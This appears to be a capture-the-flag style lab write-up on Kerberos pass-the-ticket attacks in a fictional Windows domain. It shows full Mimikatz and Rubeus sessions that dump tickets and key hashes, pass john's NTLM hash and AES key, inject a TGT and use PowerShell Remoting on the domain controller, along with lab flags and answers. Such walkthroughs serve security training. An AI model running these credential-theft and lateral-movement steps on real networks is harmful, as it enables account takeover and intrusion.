# Section 21: Pass the Ticket (PtT) from Windows

Module: 10. Password Attacks

---

## Questions & Answers

### 1. Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

Context:
```bash
C:\tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 532788 (00000000:00082134)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : MS01
Logon Server      : (null)
Logon Time        : 8/5/2026 1:56:16 AM
SID               : S-1-5-21-430213916-1543111962-1809483319-500

         * Username : MS01$
         * Domain   : inlanefreight.htb
         * Password : 16 f6 e4 f9 b3 dd 29 34 35 3b c7 df b7 ad 64 dd 75 2f 0e 37 89 4c cd 2d 52 c1 43 08 06 8a bc 23 f1 6c 5b 01 4a 6d 61 c4 e1 1c 50 10 a2 a4 9a b5 7c ea b6 cc 40 5b 9d 48 0b 99 5f 3e c2 e4 2f aa 18 51 a3 49 4f 72 72 d9 e3 3c 1f 01 fa 17 a1 02 53 f8 79 09 f5 56 f8 b9 d6 9c 88 7c 28 53 da 01 b8 8e f0 60 a1 73 9f 89 d1 59 56 60 8b 19 8a 25 89 d1 9d 1e 91 04 34 98 87 e5 8c 43 2b 5d 77 14 78 9a 41 8b 45 42 6a 6a af 55 e0 00 68 44 a8 e0 0e 2b 72 08 ca 6e fa ff 23 f1 42 8f 14 ab be 28 88 2c ff 72 df 35 2b 2b 93 76 54 c7 8c 3d 8f 00 a2 ef 2d 57 7d f2 ca 05 ed 8e 54 66 02 c7 6e 38 15 65 b7 65 20 53 46 43 eb c6 ac db cc c8 32 98 9b dd d5 7f 61 a6 4d f2 3b dd 06 11 d3 e7 6c 7b 07 8c 34 5b 24 a6 33 cc 87 07 a4 45 1c f8 31 ab

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 381763 (00000000:0005d343)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/5/2026 1:52:38 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107

         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/5/2026 1:52:38 AM ; 8/5/2026 11:52:38 AM ; 8/12/2026 1:52:38 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
           Client Name  (01) : david ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             09cc63b89604443fd93efd1deb8b54c6323ae8faa27d580af51c6c7845aee302
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;5d343]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi !

Authentication Id : 0 ; 379394 (00000000:0005ca02)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/5/2026 1:52:38 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/5/2026 1:52:38 AM ; 8/5/2026 11:52:38 AM ; 8/12/2026 1:52:38 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
           Client Name  (01) : john ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             8c6971c931e45204b50d363742476a371da56a0574e169e36a6848c6604c412e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;5ca02]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !

Authentication Id : 0 ; 72457 (00000000:00011b09)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/5/2026 1:51:36 AM
SID               : S-1-5-90-0-1

         * Username : MS01$
         * Domain   : inlanefreight.htb
         * Password : ac 97 cc b6 e7 ae 88 e1 05 f1 0a b4 9b 2e 6b 62 98 6d 71 23 00 e6 44 96 0d 74 6e d5 f7 b6 4c 2d a3 79 9a 0e a8 60 e1 40 96 38 10 e4 33 be a9 22 09 15 e2 1b 4f 2a 0d d5 21 56 2a 3e 81 0d 42 f8 cf 3b 30 51 b5 22 44 32 b8 c5 de 23 d3 6d 3a 3b 52 3e 18 07 04 c2 61 1b 74 ae b9 be 7c 69 a3 93 0f 9b 85 c1 09 35 39 9d b9 70 dc ab 9b c6 49 23 3d 57 e4 a5 92 d9 81 cc ff 6d df fa 13 22 87 77 eb c9 0e 3d a3 77 7c d4 8e dc 94 43 6d ce 2c 37 51 f4 d3 1b 73 d6 e8 e4 ca 0f ba 55 57 da ba a4 e1 dc 81 81 41 49 63 ec 6d f7 42 5d e0 d7 11 65 10 09 bf 80 79 8b fa f2 cd ac 46 e2 7a aa dc 9d 1a ff e7 ec ba c4 86 3c 26 8c a2 c7 05 63 0e 2b b3 f6 84 0d 65 5e b9 aa 23 6a de 6a 58 85 a3 54 52 45 17 84 08 a0 06 79 4e 39 53 9d db 85 dc fd

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 8/5/2026 1:51:35 AM
SID               : S-1-5-20

         * Username : ms01$
         * Domain   : INLANEFREIGHT.HTB
         * Password : 16 f6 e4 f9 b3 dd 29 34 35 3b c7 df b7 ad 64 dd 75 2f 0e 37 89 4c cd 2d 52 c1 43 08 06 8a bc 23 f1 6c 5b 01 4a 6d 61 c4 e1 1c 50 10 a2 a4 9a b5 7c ea b6 cc 40 5b 9d 48 0b 99 5f 3e c2 e4 2f aa 18 51 a3 49 4f 72 72 d9 e3 3c 1f 01 fa 17 a1 02 53 f8 79 09 f5 56 f8 b9 d6 9c 88 7c 28 53 da 01 b8 8e f0 60 a1 73 9f 89 d1 59 56 60 8b 19 8a 25 89 d1 9d 1e 91 04 34 98 87 e5 8c 43 2b 5d 77 14 78 9a 41 8b 45 42 6a 6a af 55 e0 00 68 44 a8 e0 0e 2b 72 08 ca 6e fa ff 23 f1 42 8f 14 ab be 28 88 2c ff 72 df 35 2b 2b 93 76 54 c7 8c 3d 8f 00 a2 ef 2d 57 7d f2 ca 05 ed 8e 54 66 02 c7 6e 38 15 65 b7 65 20 53 46 43 eb c6 ac db cc c8 32 98 9b dd d5 7f 61 a6 4d f2 3b dd 06 11 d3 e7 6c 7b 07 8c 34 5b 24 a6 33 cc 87 07 a4 45 1c f8 31 ab
# ...
```
- Found `john, david, julio`

**Answer:** `3`

---

### 2. Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john

Context:
```bash
mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 379394 (00000000:0005ca02)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/5/2026 1:52:38 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
           rc4_hmac_nt       c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old      c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_md4           c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_nt_exp   c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old_exp  c4b0e1b10c7ce2c4723b4e2407ef81a2

mimikatz # sekurlsa::pth /domain:INLANEFREIGHT.HTB /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2
user    : john
domain  : INLANEFREIGHT.HTB
program : cmd.exe
impers. : no
NTLM    : c4b0e1b10c7ce2c4723b4e2407ef81a2
  |  PID  1028
  |  TID  2240
  |  LSA Process is now R/W
  |  LUID 0 ; 1504018 (00000000:0016f312)
  \_ msv1_0   - data copy @ 0000018076F7BE00 : OK !
  \_ kerberos - data copy @ 0000018077A2C9F8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000018077AE7068 (32) -> null

mimikatz #
```
- Get the flag:
```bash
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
ms01\administrator

C:\Windows\system32>dir \\DC01.inlanefreight.htb\john
 Volume in drive \\DC01.inlanefreight.htb\john has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\DC01.inlanefreight.htb\john

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  03:54 PM                30 john.txt
               1 File(s)             30 bytes
               2 Dir(s)  18,267,082,752 bytes free

C:\Windows\system32>type \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn
C:\Windows\system32>
```

**Answer:** `Learn1ng_M0r3_Tr1cks_with_J0hn`

---

### 3. Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

Context:
```bash
C:\tools>Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : EM47G3PB
[*] Domain          : LWBE1XI6
[*] Password        : 94SEV2HU
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3312
[+] LUID            : 0x18f954
```
- Pass the ticket and grab the flag:
```bash
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\tools>Rubeus.exe asktgt /user:john /domain:INLANEFREIGHT.HTB /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.HTB\john'
[*] Using domain controller: 172.16.1.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKC
      BD4EggQ6T0crKAklo0wPjWS4L3egQAee0Zye3kgQPNCh9KHWLofw/N+FN5qNt8QduupQ9Ges8Tg2coxS
      W+CvchkV8t39VznA0JxcFVd3h85WsJ8A8AszTJuSmRMzAiU1srRZ/0rCAGjAJk574mD/WQ1zaeRapNWW
      4lrWnXAK7AeeDeuYLjDcEd8+oDMK+ioY7lqAH0i/YakeZn14uHJVa0vbKUi22ShhHuEJCJ0Pivw9EkfQ
      /i7WmDeCYVHmF4C3U4qWIs5NsHT5T/88k1hEIXlva4kkX3A1Qj30EIbPHBjtRGf33G4S9ekVIjPuSf8Q
      JG94za+4kS7k81C+mIOcVAghyVsn7ZkQJpo3HrK6CWcQFR30BtCozVHY+DrMNmBlbliM7DKSIdf3ImzR
      gky75nEYdzVytHYKOFL9NgV8gh9yi2YP/UvNNZBmg5iMe9gvyOr+n5w+X64iaCwBOchsBc9stLVW7W1p
      PuDQ9+1aKUAwjlvALBfvSkmoyaoSMpUoHr1deZANX6XS59eTweyDPaiatlv7pJqRr8VIyxV5aEAb95Mw
      28KY1AZubkjkg2GPl5gq44dBCld+ck38uV9YVArfiWkhgsjZ/vCma0/EfEZ8o5hufazRibOKzrpuhy7b
      EskIdMKQd2xqQO1T+vMY5fFRJoTS5tKY5Nx92TqnGVhpq9Hm8Zq0CMl4DwtdjG2sGdCq6qrPPbisLryc
      DhbCHCop1dzw4KQSPzaIRH6FgQjQEOe+8WlIIj794jgaXjZ6yUg1qNboYtmR13JBzIzGc5HRuXUkHzCR
      ElVQLYPUmhjttJBisq3C+gX9fnQEOJ7ibpCNDdJpbJSzpXqCu+X+ieKyxKYUtf8ps//7Y4vK3tfIPuss
      8+KT/pG8gVRZCXlN+qb8aJmtNOFZlFFEMbqAY6vHl2vQUbdIYq671hZQ3hRiXcUXw2hgwVfMm57V2RWs
      FptSsLG4JnQJxBlBhCifhtdidwF+mn9jvjUoNInb1JuVzFAgDhVcNVTVoTn9A+VaJeDZGpTLEvink+p8
      eTdj0KcPg7gwBobnS6TDiytEwujgCFsUUtarpIlMDQrjA0i+27F2GD8V7A8/n3YOG23ix5dE0UZtWw8C
      v59O1CoicAVde4kpbP46QDihTwCc3eHgwrT73x5sjBWVxNw4kAc7q5A/z3h8MKJ/hqrIcPjWAHyk2DKo
      fcfd4h55YTjWOYQ89MevLtue6g7LuCJzvLzgjsfYy5lyadXFPekY5gI66UG5VgSOaWEqyIs2fqIvbrJd
      gLcrLwdSkxEcN5GVbBGIdPsdb7+Q46oY1NSvFJ0DzW4nbToRQB4ahKXwrqjrBXaHq+y+sxHyu9Cf8tSt
      XmVC3dGYnryXGOtPHmsl1iCBBfwELaz7er7W40R92m/3+99In+T8VId0jMnQs5z7NLV8zjzdWDTlTjFC
      +Siahxpe7wWjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAoQH2xUVDm
      1yHP6RPcagUgyFGRqusy56jz1gG+w3rQ4qETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYb
      BGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MDUwNzMzMjFaphEYDzIwMjYwODA1MTczMzIxWqcRGA8yMDI2
      MDgxMjA3MzMyMVqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFO
      RUZSRUlHSFQuSFRC
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.HTB
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  8/5/2026 2:33:21 AM
  EndTime                  :  8/5/2026 12:33:21 PM
  RenewTill                :  8/12/2026 2:33:21 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  KEB9sVFQ5tchz+kT3GoFIMhRkarrMueo89YBvsN60OI=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC


C:\tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> type C:\john\john.txt
P4$$_th3_Tick3T_PSR
[DC01]: PS C:\Users\john\Documents>
```

**Answer:** `P4$$_th3_Tick3T_PSR`

---

[Back to Module Index](./README.md)
